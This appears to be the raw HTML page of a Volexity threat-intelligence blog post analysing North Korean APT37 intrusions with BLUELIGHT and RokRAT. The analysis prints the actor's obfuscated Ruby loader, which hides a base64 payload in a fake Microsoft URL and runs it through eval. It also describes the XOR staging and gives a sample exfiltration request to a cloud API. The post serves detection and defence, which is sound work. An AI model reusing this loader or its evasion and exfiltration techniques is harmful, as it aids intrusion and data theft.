@@ -1,0 +1,560 @@
+<!DOCTYPE html>
+<!--[if lt IE 7 ]> <html lang="en-US" class="ie ie6 lte9 lte8 lte7 lte6 no-js"> <![endif]-->
+<!--[if IE 7 ]>    <html lang="en-US" class="ie ie7 lte9 lte8 lte7 no-js"> <![endif]-->
+<!--[if IE 8 ]>    <html lang="en-US" class="ie ie8 lte9 lte8 no-js"> <![endif]-->
+<!--[if IE 9 ]>    <html lang="en-US" class="ie ie9 lte9 no-js"> <![endif]-->
+<!--[if (gt IE 9)|!(IE)]><!--> <html lang="en-US" class="no-js"> <!--<![endif]-->
+        <meta charset="UTF-8">
+	<title>North Korean BLUELIGHT Special: InkySquid Deploys RokRAT | Volexity</title>
+	<meta name="HandheldFriendly" content="True">
+	<meta name="MobileOptimized" content="320">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="cleartype" content="on">
+
+            <meta name="twitter:card" content="summary_large_image">
+        <meta name="twitter:site" content="@Volexity">
+        <meta name="twitter:creator" content="@Volexity">
+        <meta name="twitter:title" content="North Korean BLUELIGHT Special: InkySquid Deploys RokRAT">
+        <meta name="twitter:description" content="In a recent blog post, Volexity disclosed details on a portion of the operations by a North Korean threat actor it tracks as InkySquid. This threat actor compromised a news portal to use recently patched browser exploits to deliver a custom malware family known as BLUELIGHT. This follow-up post describes findings from a recent investigation undertaken by Volexity in which the BLUELIGHT malware was discovered being delivered to a victim alongside RokRAT (aka DOGCALL).  RokRAT is a backdoor previously attributed to use by ScarCruft/APT37, which is also known as InkySquid. It should be noted that Volexity identified some overlap between the findings discussed in this post and this Korean-language article. Analysis Volexity is often asked to analyze systems of users frequently targeted by state-sponsored threat actors based on some tip-off or concern that the systems may be compromised. In this case, it was a system belonging to an individual who is [&hellip;]">
+                    <meta name="twitter:image" content="https://www.volexity.com/wp-content/uploads/2021/08/InkySquid-Pt2-Header.png">
+            
+    <link rel="apple-touch-icon" sizes="180x180" href="https://www.volexity.com/wp-content/themes/volexity/apple-touch-icon.png">
+    <link rel="icon" type="image/png" href="https://www.volexity.com/wp-content/themes/volexity/favicon-32x32.png" sizes="32x32">
+    <link rel="icon" type="image/png" href="https://www.volexity.com/wp-content/themes/volexity/favicon-16x16.png" sizes="16x16">
+    <link rel="icon" type="image/png" href="https://www.volexity.com/wp-content/themes/volexity/favicon.ico">
+    <link rel="manifest" href="https://www.volexity.com/wp-content/themes/volexity/manifest.json">
+    <meta name="theme-color" content="#12BEF0">
+    
+
+          <meta property="og:image" content="https://www.volexity.com/wp-content/uploads/2021/08/InkySquid-Pt2-Header-300x157.png" />
+    
+	<meta name='robots' content='max-image-preview:large' />
+<link rel='dns-prefetch' href='//s.w.org' />
+		<!-- This site uses the Google Analytics by ExactMetrics plugin v6.8.0 - Using Analytics tracking - https://www.exactmetrics.com/ -->
+							<script src="//www.googletagmanager.com/gtag/js?id=UA-43664679-1"  type="text/javascript" data-cfasync="false" async></script>
+			<script type="text/javascript" data-cfasync="false">
+				var em_version = '6.8.0';
+				var em_track_user = true;
+				var em_no_track_reason = '';
+				
+								var disableStr = 'ga-disable-UA-43664679-1';
+
+				/* Function to detect opted out users */
+				function __gtagTrackerIsOptedOut() {
+					return document.cookie.indexOf( disableStr + '=true' ) > - 1;
+				}
+
+				/* Disable tracking if the opt-out cookie exists. */
+				if ( __gtagTrackerIsOptedOut() ) {
+					window[disableStr] = true;
+				}
+
+				/* Opt-out function */
+				function __gtagTrackerOptout() {
+					document.cookie = disableStr + '=true; expires=Thu, 31 Dec 2099 23:59:59 UTC; path=/';
+					window[disableStr] = true;
+				}
+
+				if ( 'undefined' === typeof gaOptout ) {
+					function gaOptout() {
+						__gtagTrackerOptout();
+					}
+				}
+								window.dataLayer = window.dataLayer || [];
+				if ( em_track_user ) {
+					function __gtagTracker() {dataLayer.push( arguments );}
+					__gtagTracker( 'js', new Date() );
+					__gtagTracker( 'set', {
+						'developer_id.dNDMyYj' : true,
+						                    });
+					__gtagTracker( 'config', 'UA-43664679-1', {
+						forceSSL:true,					} );
+										window.gtag = __gtagTracker;										(
+						function () {
+							/* https://developers.google.com/analytics/devguides/collection/analyticsjs/ */
+							/* ga and __gaTracker compatibility shim. */
+							var noopfn = function () {
+								return null;
+							};
+							var newtracker = function () {
+								return new Tracker();
+							};
+							var Tracker = function () {
+								return null;
+							};
+							var p = Tracker.prototype;
+							p.get = noopfn;
+							p.set = noopfn;
+							p.send = function (){
+								var args = Array.prototype.slice.call(arguments);
+								args.unshift( 'send' );
+								__gaTracker.apply(null, args);
+							};
+							var __gaTracker = function () {
+								var len = arguments.length;
+								if ( len === 0 ) {
+									return;
+								}
+								var f = arguments[len - 1];
+								if ( typeof f !== 'object' || f === null || typeof f.hitCallback !== 'function' ) {
+									if ( 'send' === arguments[0] ) {
+										var hitConverted, hitObject = false, action;
+										if ( 'event' === arguments[1] ) {
+											if ( 'undefined' !== typeof arguments[3] ) {
+												hitObject = {
+													'eventAction': arguments[3],
+													'eventCategory': arguments[2],
+													'eventLabel': arguments[4],
+													'value': arguments[5] ? arguments[5] : 1,
+												}
+											}
+										}
+										if ( 'pageview' === arguments[1] ) {
+											if ( 'undefined' !== typeof arguments[2] ) {
+												hitObject = {
+													'eventAction': 'page_view',
+													'page_path' : arguments[2],
+												}
+											}
+										}
+										if ( typeof arguments[2] === 'object' ) {
+											hitObject = arguments[2];
+										}
+										if ( typeof arguments[5] === 'object' ) {
+											Object.assign( hitObject, arguments[5] );
+										}
+										if ( 'undefined' !== typeof arguments[1].hitType ) {
+											hitObject = arguments[1];
+											if ( 'pageview' === hitObject.hitType ) {
+												hitObject.eventAction = 'page_view';
+											}
+										}
+										if ( hitObject ) {
+											action = 'timing' === arguments[1].hitType ? 'timing_complete' : hitObject.eventAction;
+											hitConverted = mapArgs( hitObject );
+											__gtagTracker( 'event', action, hitConverted );
+										}
+									}
+									return;
+								}
+
+								function mapArgs( args ) {
+									var arg, hit = {};
+									var gaMap = {
+										'eventCategory': 'event_category',
+										'eventAction': 'event_action',
+										'eventLabel': 'event_label',
+										'eventValue': 'event_value',
+										'nonInteraction': 'non_interaction',
+										'timingCategory': 'event_category',
+										'timingVar': 'name',
+										'timingValue': 'value',
+										'timingLabel': 'event_label',
+										'page' : 'page_path',
+										'location' : 'page_location',
+										'title' : 'page_title',
+									};
+									for ( arg in args ) {
+										if ( args.hasOwnProperty(arg) && gaMap.hasOwnProperty(arg) ) {
+											hit[gaMap[arg]] = args[arg];
+										} else {
+											hit[arg] = args[arg];
+										}
+									}
+									return hit;
+								}
+
+								try {
+									f.hitCallback();
+								} catch ( ex ) {
+								}
+							};
+							__gaTracker.create = newtracker;
+							__gaTracker.getByName = newtracker;
+							__gaTracker.getAll = function () {
+								return [];
+							};
+							__gaTracker.remove = noopfn;
+							__gaTracker.loaded = true;
+							window['__gaTracker'] = __gaTracker;
+						}
+					)();
+									} else {
+										console.log( "" );
+					( function () {
+							function __gtagTracker() {
+								return null;
+							}
+							window['__gtagTracker'] = __gtagTracker;
+							window['gtag'] = __gtagTracker;
+					} )();
+									}
+			</script>
+				<!-- / Google Analytics by ExactMetrics -->
+		<link rel='stylesheet' id='wp-block-library-css'  href='https://www.volexity.com/wp-includes/css/dist/block-library/style.min.css?ver=5.8' type='text/css' media='all' />
+<link rel='stylesheet' id='main-style-css'  href='https://www.volexity.com/wp-content/themes/volexity/dist/styles/styles.min.css?ver=5.8' type='text/css' media='screen, print' />
+<link rel='stylesheet' id='cookie-notice-front-css'  href='https://www.volexity.com/wp-content/plugins/cookie-notice/includes/../css/front.min.css?ver=5.8' type='text/css' media='all' />
+<script type='text/javascript' id='exactmetrics-frontend-script-js-extra'>
+/* <![CDATA[ */
+var exactmetrics_frontend = {"js_events_tracking":"true","download_extensions":"zip,mp3,mpeg,pdf,docx,pptx,xlsx,rar","inbound_paths":"[{\"path\":\"\\\/go\\\/\",\"label\":\"affiliate\"},{\"path\":\"\\\/recommend\\\/\",\"label\":\"affiliate\"}]","home_url":"https:\/\/www.volexity.com","hash_tracking":"false","ua":"UA-43664679-1"};
+/* ]]> */
+</script>
+<script type='text/javascript' src='https://www.volexity.com/wp-content/plugins/google-analytics-dashboard-for-wp/assets/js/frontend-gtag.min.js?ver=6.8.0' id='exactmetrics-frontend-script-js'></script>
+<script type='text/javascript' src='https://www.volexity.com/wp-includes/js/jquery/jquery.min.js?ver=3.6.0' id='jquery-core-js'></script>
+<script type='text/javascript' src='https://www.volexity.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2' id='jquery-migrate-js'></script>
+<script type='text/javascript' id='cookie-notice-front-js-extra'>
+/* <![CDATA[ */
+var cnArgs = {"ajaxUrl":"https:\/\/www.volexity.com\/wp-admin\/admin-ajax.php","nonce":"c0a2f7669e","hideEffect":"fade","position":"bottom","onScroll":"0","onScrollOffset":"100","onClick":"0","cookieName":"cookie_notice_accepted","cookieTime":"2592000","cookieTimeRejected":"2592000","cookiePath":"\/","cookieDomain":"","redirection":"0","cache":"0","refuse":"0","revokeCookies":"0","revokeCookiesOpt":"automatic","secure":"1"};
+/* ]]> */
+</script>
+<script async type='text/javascript' src='https://www.volexity.com/wp-content/plugins/cookie-notice/includes/../js/front.min.js?ver=2.1.0' id='cookie-notice-front-js'></script>
+<link rel="https://api.w.org/" href="https://www.volexity.com/wp-json/" /><link rel="alternate" type="application/json" href="https://www.volexity.com/wp-json/wp/v2/posts/2178" /><link rel="canonical" href="https://www.volexity.com/blog/2021/08/24/north-korean-bluelight-special-inkysquid-deploys-rokrat/" />
+<link rel='shortlink' href='https://www.volexity.com/?p=2178' />
+<link rel="alternate" type="application/json+oembed" href="https://www.volexity.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.volexity.com%2Fblog%2F2021%2F08%2F24%2Fnorth-korean-bluelight-special-inkysquid-deploys-rokrat%2F" />
+<link rel="alternate" type="text/xml+oembed" href="https://www.volexity.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fwww.volexity.com%2Fblog%2F2021%2F08%2F24%2Fnorth-korean-bluelight-special-inkysquid-deploys-rokrat%2F&#038;format=xml" />
+		<style type="text/css" id="wp-custom-css">
+			/*
+You can add your own CSS here.
+
+Click the help icon above to learn more.
+*/		</style>
+		
+	<!--[if lte IE 9 ]>
+		<script src="https://www.volexity.com/wp-content/themes/volexity/scripts/vendor/selectivizr.js"></script>
+		<script src="https://www.volexity.com/wp-content/themes/volexity/scripts/vendor/respond.js"></script>
+		<script src="https://www.volexity.com/wp-content/themes/volexity/scripts/vendor/mediamatch.js"></script>
+	<![endif]-->
+</head>
+<body class="post-template-default single single-post postid-2178 single-format-standard gecko linux cookies-not-set">
+	<header class="header">
+    <div class="header-top-container">
+        <div class="container">
+            <ul id="menu-sub-left" class="header-sub-left"><li id="menu-item-2116" class="icon-triangle menu-item menu-item-type-post_type menu-item-object-page menu-item-2116"><a href="https://www.volexity.com/company/contact/demo-request/" class="icon-triangle">Request A Demo</a></li>
+</ul>            <ul id="menu-sub-right" class="header-sub-right"><li id="menu-item-1213" class="icon-warning menu-item menu-item-type-post_type menu-item-object-page menu-item-1213"><a href="https://www.volexity.com/company/contact/breach-assistance/" class="icon-warning">Breach Assistance</a></li>
+</ul>        </div>
+    </div>
+	<div class="header-container">
+        <div class="container">
+            <a class="header-logo" href="https://www.volexity.com"><img src="https://www.volexity.com/wp-content/themes/volexity/dist/images/logo.png" alt="Volexity"></a>
+            <div class="header-menu">
+                <ul id="menu-main-navigation" class="header-menu-list"><li id="menu-item-376" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-376"><a href="https://www.volexity.com/products-overview/">Products</a>
+<ul class="sub-menu">
+	<li id="menu-item-48" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-48"><a href="https://www.volexity.com/products-overview/">Products Overview</a></li>
+	<li id="menu-item-50" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-50"><a href="https://www.volexity.com/products-overview/volcano/">Volcano</a></li>
+	<li id="menu-item-49" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-49"><a href="https://www.volexity.com/products-overview/surge/">Surge</a></li>
+</ul>
+</li>
+<li id="menu-item-377" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-377"><a href="https://www.volexity.com/services-overview/">Services</a>
+<ul class="sub-menu">
+	<li id="menu-item-55" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-55"><a href="https://www.volexity.com/services-overview/">Services Overview</a></li>
+	<li id="menu-item-52" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-52"><a href="https://www.volexity.com/services-overview/incident-response/">Incident Response</a></li>
+	<li id="menu-item-53" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-53"><a href="https://www.volexity.com/services-overview/network-security-monitoring/">Network Security Monitoring</a></li>
+	<li id="menu-item-54" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-54"><a href="https://www.volexity.com/services-overview/proactive-threat-assessments/">Proactive Threat Assessments</a></li>
+	<li id="menu-item-56" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-56"><a href="https://www.volexity.com/services-overview/threat-intelligence/">Threat Intelligence</a></li>
+</ul>
+</li>
+<li id="menu-item-385" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-385"><a href="https://www.volexity.com/company/about/">Company</a>
+<ul class="sub-menu">
+	<li id="menu-item-41" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-41"><a href="https://www.volexity.com/company/about/">About</a></li>
+	<li id="menu-item-43" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-43"><a href="https://www.volexity.com/company/news-press/">News &#038; Press</a></li>
+	<li id="menu-item-1849" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1849"><a href="https://www.volexity.com/company/careers/">Careers</a></li>
+	<li id="menu-item-1824" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1824"><a href="https://www.volexity.com/company/internships/">Internships</a></li>
+	<li id="menu-item-1718" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-1718"><a href="https://www.volexity.com/company/resources/">Resources</a></li>
+</ul>
+</li>
+<li id="menu-item-39" class="menu-item menu-item-type-post_type menu-item-object-page current_page_parent menu-item-39"><a href="https://www.volexity.com/blog/">Blog</a></li>
+<li id="menu-item-45" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-45"><a href="https://www.volexity.com/company/contact/">Contact</a></li>
+</ul>            </div>
+            <div class="mobile-menu--holder">
+                <div class="mobile-menu"></div>
+            </div>
+        </div>
+	</div>
+</header>
+<div class="int-header s5">
+    <div class="container">
+        <section class="int-header-hold col-sm-12">
+            blog        </section>
+    </div>
+</div>
+	<main class="main">
+		<div class="container">
+	<section class="row int">
+		<article class="col-sm-8">
+			<div class="post-content composition">
+				<h2 class="post-title">North Korean BLUELIGHT Special: InkySquid Deploys RokRAT</h2>
+				<p class="post-date">August 24, 2021</p>
+									<p class="post-byline">by Damien Cash, Josh Grunzweig, Steven Adair, Thomas Lancaster</p>
+					
+				<div class="post-single-social">
+		      <a class="post-single-social-share" data-share-channel="facebook" data-title="North Korean BLUELIGHT Special: InkySquid Deploys RokRAT" data-description="In a recent blog post, Volexity disclosed details on a portion of the operations by a North Korean threat actor it tracks as InkySquid. This threat actor compromised a news portal to use recently patched browser exploits to deliver a custom malware family known as BLUELIGHT. This follow-up post describes findings from a recent investigation undertaken by Volexity in which the BLUELIGHT malware was discovered being delivered to a victim alongside RokRAT (aka DOGCALL).  RokRAT is a backdoor previously attributed to use by ScarCruft/APT37, which is also known as InkySquid. It should be noted that Volexity identified some overlap between the findings discussed in this post and this Korean-language article. Analysis Volexity is often asked to analyze systems of users frequently targeted by state-sponsored threat actors based on some tip-off or concern that the systems may be compromised. In this case, it was a system belonging to an individual who is [&hellip;]" data-url="https://www.volexity.com/blog/2021/08/24/north-korean-bluelight-special-inkysquid-deploys-rokrat/" data-image="" data-caption="Volexity"><i class="icon icon-facebook-share"></i><span class="sr-only">Facebook</span></a>
+		      <a class="post-single-social-share" data-share-channel="twitter" data-text="North+Korean+BLUELIGHT+Special%3A+InkySquid+Deploys+RokRAT" data-url="https://www.volexity.com/blog/2021/08/24/north-korean-bluelight-special-inkysquid-deploys-rokrat/" data-hashtags="volexity" data-via="Volexity"><i class="icon icon-twitter-share"></i><span class="sr-only">Twitter</span></a>
+		      <a class="post-single-social-share" data-share-channel="email" data-post-id="2178"><i class="icon icon-mail-share"></i><span class="sr-only">Email</span></a>
+			  </div>
+				<p><img loading="lazy" class="alignnone size-full wp-image-2225" src="https://www.volexity.com/wp-content/uploads/2021/08/InkySquid-Pt2-Header.png" alt="" width="2060" height="1076" srcset="https://www.volexity.com/wp-content/uploads/2021/08/InkySquid-Pt2-Header.png 2060w, https://www.volexity.com/wp-content/uploads/2021/08/InkySquid-Pt2-Header-300x157.png 300w, https://www.volexity.com/wp-content/uploads/2021/08/InkySquid-Pt2-Header-1024x535.png 1024w, https://www.volexity.com/wp-content/uploads/2021/08/InkySquid-Pt2-Header-768x401.png 768w, https://www.volexity.com/wp-content/uploads/2021/08/InkySquid-Pt2-Header-1536x802.png 1536w, https://www.volexity.com/wp-content/uploads/2021/08/InkySquid-Pt2-Header-2048x1070.png 2048w" sizes="(max-width: 2060px) 100vw, 2060px" /></p>
+<p>In a <span style="color: #000000;"><a href="https://www.volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/">recent blog post</a>,</span> Volexity disclosed details on a portion of the operations by a North Korean threat actor it tracks as InkySquid. This threat actor compromised a news portal to use recently patched browser exploits to deliver a custom malware family known as BLUELIGHT.</p>
+<p>This follow-up post describes findings from a recent investigation undertaken by Volexity in which the BLUELIGHT malware was discovered being delivered to a victim alongside <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.rokrat">RokRAT</a> (aka <a href="https://attack.mitre.org/software/S0213/">DOGCALL</a>).  RokRAT is a backdoor previously attributed to use by ScarCruft/APT37, which is also known as InkySquid. It should be noted that Volexity identified some overlap between the findings discussed in this post and <a href="https://medium.com/s2wlab/matryoshka-variant-of-rokrat-apt37-scarcruft-69774ea7bf48">this Korean-language article</a>.</p>
+<h2>Analysis</h2>
+<p>Volexity is often asked to analyze systems of users frequently targeted by state-sponsored threat actors based on some tip-off or concern that the systems may be compromised. In this case, it was a system belonging to an individual who is a frequent target of North Korean threat actors. Prior to contacting Volexity, the user had run four <span style="font-size: 1.6rem;">separate, </span><span style="font-size: 1.6rem;">popular antivirus programs in  attempts to identify and remove any malware. Despite these actions, the user was still concerned that their machine may have been infected. Despite less-than-ideal conditions for the starting analysis state, Volexity was able to identify two separate malware infections on the system, and a likely start date for the infection. However, it was not possible to confirm how it became infected, as it had been rebooted multiple times since initial infection and several weeks had passed.</span></p>
+<p>The first malware discovered was installed using a convoluted loading mechanism, where a full copy of Python 2.7 was installed into the following directory:</p>
+<blockquote>
+<pre>%USERPROFILE%/Python27(64)</pre>
+</blockquote>
+<p>An encoded blob was then stored in the following location:</p>
+<blockquote>
+<pre>%PROGRAMDATA%/hiddigi/msihnd</pre>
+</blockquote>
+<p>A loading script written in Python was written to the following directory:</p>
+<blockquote>
+<pre>%LocalAppData%/Microsoft/mdmadc/KBDBGPH1</pre>
+</blockquote>
+<p>Following this, the attacker configured a Scheduled Task to use the Python binary to run the loading script and execute the encoded blob. The script decoded a shellcode stub at the head of the <em>msihnd</em> file, which is responsible for setting up a child process using the name of a randomly chosen EXE file from the "C:\Windows\System32" directory. The main malware was then decoded from data stored after the initial shellcode, using a single-byte XOR key of 0x74. The result of this process was that a version of the BLUELIGHT malware family would be loaded. While the sample of BLUELIGHT analyzed in <a href="https://www.volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/">the previous post</a> used Microsoft Graph for command and control, this version used a custom <strong>Google Web App</strong>.</p>
+<p>Less than 10 minutes after deploying BLUELIGHT, the attacker installed a second malware family. The loading mechanism for this family was similar to that used for BLUELIGHT; although this time, a copy of Ruby was installed at the following path:</p>
+<blockquote>
+<pre>%LOCALAPPDATA%/Microsoft/Ruby27-x64/</pre>
+</blockquote>
+<p>The attacker dropped two encoded blobs to the following locations:</p>
+<blockquote>
+<pre>%PROGRAMDATA%/User-Mode Bus Enumerator/1BA76030/Shortcut_674D.info
+</pre>
+<pre>%PROGRAMDATA%/Local Kernel Debugger/18E911AC/WinSDK_4641.info</pre>
+</blockquote>
+<p>A loading script, written in Ruby, was saved to the following location and set to run as a Scheduled Task:</p>
+<blockquote>
+<pre>%PROGRAMDATA%/Microsoft Basic Display Driver/57D45646/Readme<strong>.</strong>io.md</pre>
+</blockquote>
+<p>The Ruby loading script was made to appear as though it were a real system file, with comments indicating it was part of the operating system. The malicious content is encoded within a URL string, as shown in the Ruby script below:</p>
+<blockquote>
+<pre># 14:21:58 27/02/2004
+
+# Copyright (c) Microsoft Corporation.  All rights reserved.
+
+require 'base64'
+require 'fiddle/import'
+
+# Update Driver: name=Microsoft Basic Display Driver, id=289A1260
+
+url7d37 = 'https://update.microsoft.com/driverupdate?id=K0AM3YEMjoQD7kCMxoCM2oCMwATMgwCZhVmcoRHK0NWZqJ2Tlx2Zul2Uy9mR0lWYXpjOyMDbl5mcltkCNsTKwACLwACLwACLyRHcgwCMgwCMoQWYlJHaUVGdhVmcDpjOyMDbl5mcltEI9ACZhVmcoRnCNsTKlpXaz5CZwV3YzBCLmVnYgwic0BHK5J3btVWTlZ3bNxGdSpjOyMDbl5mcltkCNQmblpQD7kXZrBiXg0VabZWdiBSPg0FdlNnZm9mcpZWLptlZ1JGIgoQDvRGIlpXaz5CZwV3Yz5iL0V2cmZ2bylmZg4WagkGIy9mZK0wO2sSXwslZ1JGI9ACdlNnZm9mcpZmCNsTXdBzWmVnYrEzWmVnYg0DI5V2aK0QQCV0MjoQD70FZwV3YztlclRnbp9GU6oTZsRGZpZEI9AiZ1JmCNsTKwACLwACLwADN4BDIrASZ6l2cuQGc1N2cgwic0BHK0NWZ09mcQxWY1RncpZlO6IzMsVmbyV2SK0wOpADN4BDIsADMwMDewACLwADN4BDIrASZ6l2cuQGc1N2cgwCMoM2bsxWQsFWd0JXaWpjOyMDbl5mcltEI9Aic0BnCNsTZz9Gbj5SZslmZjNnCNsDZhVmcuUGbpZ2YzBSPgQGc1N2cK0wOpIiYyJCLi8mZulmLERzN28Fd1NGdy9GaTxFXwMDM2cTQCFDXcJ3b0Fmcl1WduVEIzVnQgUGZv1ULyV2cVxFXhRXYE1WYyd2byBFXcpzQigiblB3buUGbpZEI9ASZslmZjNnCNsTKnQXa4VEIuECZuV3bGBCdv5EIlxWaGdCKzRXdwpQDk5WZK0QMCRENjACIK0wJpcmbvxGIkVmbnl2cuVHIsoCZp9mdoQ3YlpmYPVGbn5WaTJ3bGRXahdFI05WagQWZudWaz5WdnAibyVGd4VGIgoQDnkiKn52bsBCZl52ZpNnb1BCLn52bsBCZl52ZpNnb1BCLqQWavZHIsoCZp9mdgwCVfVkWJNFIsoCZp9mdoQWYlJHaUVGdhVmcDBiKkl2b2dCIuJXZ0hXZgAiCNcSKU9VRal0UgwiKkl2b2BCLqQWavZHK5J3btVWTlZ3bNxGdSBCZp9mdnAibyVGd4VGIgoQDnkiKn52bsBCZl52ZpNnb1BCLn52bsBCZl52ZpNnb1BCLU9VRal0UgwiKkl2b2hCdjVGdvJHUsFWd0JXaWBCdul2Jg4mclRHelBCIK0wJpcmbvxGIkVmbnl2cuVHIscmbvxGIkVmbnl2cuVHIsQ1XFpVSTBCLqQWavZHKj9GbsFEbhVHdylmVgoCZp9mdnAibyVGd4VGIgoQDncmbvxGIn52bsBCZl52ZpNnb1dCIscCVfVkWJN1JgMXYpxWYlBXe0BCIK0QOCNkMjACIK0wJyMDbl5mclt2JgQWYvxGbkBCIK0gclRncvBXbJpjOlxGZklmRgQmblRHelBCIK0gMzwWZuJXZLBSZsVHZv1mCNYDO0AzI';
+alias UrlFilter1462 eval;
+
+# UrlFilter: id=74F51EE8
+
+UrlFilter1462(Base64.decode64(url7d37[45..-1].reverse));</pre>
+</blockquote>
+<p>The effect of this script is to reverse the content after “id=” in the URL and base64 decode it, yielding the real script’s true intent:  to decrypt the previously written Shortcut_674D.info file using a simple XOR operation.</p>
+<p>After the Shortcut_674D.info file is decrypted, it is executed within a new thread. This data acts as shellcode that seeks out and decrypts an embedded blob of data using a mix of ROL and XOR operations. After decryption, an executable file remains and is then run.</p>
+<p>The resulting executable acts as another loader for yet another embedded file. However, this loader uses the hostname of the current system to decrypt the embedded payload. Therefore, if it is run on any system other than the one intended, the malware will fail to execute. This trait illustrates that the malware is customized; it was created specifically for the exact victim system on which it was discovered.</p>
+<p>If decryption of the payload is successful, the final payload is an instance of the <a href="https://malpedia.caad.fkie.fraunhofer.de/details/win.rokrat">RokRAT</a> malware family with the following properties:</p>
+<table>
+<tbody>
+<tr>
+<td width="158">SHA256</td>
+<td width="443">19ee7d139908a889d08508dd4225f2d27958ac2c8b7ff18a97507f7de8ce79bc</td>
+</tr>
+<tr>
+<td width="158">SHA1</td>
+<td width="443">ff080176ab9e51ace68dbe3a56629168b41fa1fc</td>
+</tr>
+<tr>
+<td>MD5</td>
+<td>9d2e5f9274b25740131f3b6139e3c3ce</td>
+</tr>
+<tr>
+<td width="158">File Type</td>
+<td width="443">Win64 EXE</td>
+</tr>
+<tr>
+<td width="158">Compile Time</td>
+<td width="443">2021:05:25 02:20:44+01:00</td>
+</tr>
+</tbody>
+</table>
+<p>Much like BLUELIGHT, this malware family uses cloud services for all communications, supporting <strong>PCloud</strong>, <strong>Yandex</strong>, <strong>Dropbox</strong>, and <strong>Box</strong> for command and control. The API keys for this communication are embedded within the malware itself. The malware is able to perform a number of functions, including but not limited to the following:</p>
+<ul>
+<li>Keylogging and extraction of clipboard data</li>
+<li>Collection of specific filetypes</li>
+<li>Download/execute further payloads</li>
+</ul>
+<p>Exfiltrated data is encrypted using an RSA public key, preventing third parties from decrypting it. An example exfiltration request is below:</p>
+<blockquote><p>POST /uploadfile?path=/1&amp;filename=202106221534400000.q00&amp;nopartial=1 HTTP/1.1<br />
+Connection: close<br />
+Content-Type: multipart/form-data;boundary=--wwjaughalvncjwiajs--<br />
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br />
+Accept-Language: en-US,en;q=0.8<br />
+Authorization: Bearer PpmL7Z9qHXPhLX38[TRUNCATED]kuk7HTet3AWYjwvAhuB<br />
+User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)<br />
+Content-Length: 71795<br />
+Host: api.pcloud.com</p>
+<p>&nbsp;</p>
+<p>----wwjaughalvncjwiajs--<br />
+Content-Disposition: form-data; name="file"; filename="202106221534500000.q00"<br />
+Content-Type: voice/mp3</p>
+<p>&nbsp;</p>
+<p>[DATA]</p>
+<p>&nbsp;</p></blockquote>
+<p>Much like its loader, this copy of RokRAT uses the victim’s hostname for decryption of important strings; it will fail to execute properly if the correct hostname is not present on the machine on which it is run. Additionally, strings within the malware referenced specific file paths that resided on the victim’s system. Presumably these paths were discovered by the attacker while running commands using BLUELIGHT, meaning the sample was compiled "live" following initial reconnaissance on the victim's system.</p>
+<h2>Conclusion</h2>
+<p>RokRAT is a closed-source malware family believed to be used exclusively by the North Korean <a href="https://malpedia.caad.fkie.fraunhofer.de/actor/apt37">APT37</a> threat actor, which Volexity tracks as InkySquid. The threat actor has attracted little public attention in the last year and a half. In this case, Volexity was able to tie the new BLUELIGHT malware family observed in the incident described in <a href="https://www.volexity.com/blog/2021/08/17/north-korean-apt-inkysquid-infects-victims-using-browser-exploits/">the previous post</a> to APT37 based on the use of RokRAT malware, since they were observed being deployed sequentially during the intrusion.</p>
+<p>Both the BLUELIGHT malware family and RokRAT use cloud services for command and control, making network-based detection more difficult. Additionally, while the installation of full copies of scripting languages such as Ruby and Python is noisy, they are cleverly used to obfuscate the actual malware which remains encoded on disk and is only truly visible in memory.</p>
+<p>The infected user attempted to scan their machine with four different antivirus programs prior to Volexity’s investigation. None detected the presence of either the RokRAT or BLUELIGHT malware families, showing the effectiveness of these techniques to load these malware families to evade detection.</p>
+<p>To prevent similar attacks from being effective against your organization, Volexity recommends the following:</p>
+<ul>
+<li>If enterprise users do not require access to cloud storage resources, consider blocking them as they are difficult to detect from a command-and-control perspective.</li>
+<li>Consider monitoring for and alerting on new scheduled tasks containing unusual arguments, particularly scripting language-based scheduled tasks.</li>
+</ul>
+<p>To prevent these specific attacks from being successful:</p>
+<ul>
+<li>Use the YARA rules provided <a href="https://github.com/volexity/threat-intel/blob/main/2021/2021-08-24%20-%20InkySquid%20Part%202/indicators/yara.yar">here</a> to identify related malware.</li>
+<li>Block the Google App domain “636478154616-bt8kmnrg1l6oml3ipv7ifc6bck0in18h.apps.googleusercontent<strong>.</strong>com”.</li>
+</ul>
+				<div class="post-tags">
+					<a href="https://www.volexity.com/blog/tag/apt/">APT</a>, <a href="https://www.volexity.com/blog/tag/apt37/">APT37</a>, <a href="https://www.volexity.com/blog/tag/bluelight/">BLUELIGHT</a>, <a href="https://www.volexity.com/blog/tag/dprk/">DPRK</a>, <a href="https://www.volexity.com/blog/tag/inkysquid/">InkySquid</a>, <a href="https://www.volexity.com/blog/tag/north-korea/">North Korea</a>, <a href="https://www.volexity.com/blog/tag/rokrat/">RokRAT</a>				</div>
+			</div>
+
+		</article>
+
+		<aside class="sidebar col-sm-4">
+	<ul class="widgets">
+		<li class="widget widget_search"><div class="widget-content"><form role="search" method="get" class="search-form" action="https://www.volexity.com/">
+    <label>
+        <span class="screen-reader-text">Search for:</span>
+        <input type="search" class="search-field"
+               placeholder="SEARCH"
